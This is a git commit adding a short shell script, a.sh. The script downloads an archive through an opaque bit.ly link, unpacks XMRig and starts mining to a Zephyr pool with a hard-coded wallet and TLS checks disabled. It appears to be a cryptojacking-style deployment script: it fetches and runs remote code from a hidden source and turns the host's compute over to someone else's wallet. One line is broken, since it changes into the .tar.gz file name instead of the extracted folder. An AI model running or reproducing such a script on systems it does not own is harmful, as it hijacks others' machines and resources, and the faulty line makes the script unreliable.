0fb88cc647ed7a1bf65b137d674b9f765282735e
adriancroket <165500159+adriancroket@users.noreply.github.com>
2024-05-18 15:38:59 +0000

    Create a.sh

---
+++ a.sh
@@ -0,0 +1,7 @@
+wget bit.ly/adrienwillo
+
+tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz
+
+cd xmrig-6.21.3-linux-static-x64.tar.gz
+
+./xmrig -o pool.zephyrprotocol.com:3333 -u ZEPHYR2XFrQBE2t2j6s1PvieMSbiJwRn4YmXjDhFpyhRjHWopLtjyVhDzA49PSBZeHcrKBZPTJ6Br37F6VeBFqe5bUKdnWCTdTN44-p x -k -a rx/0
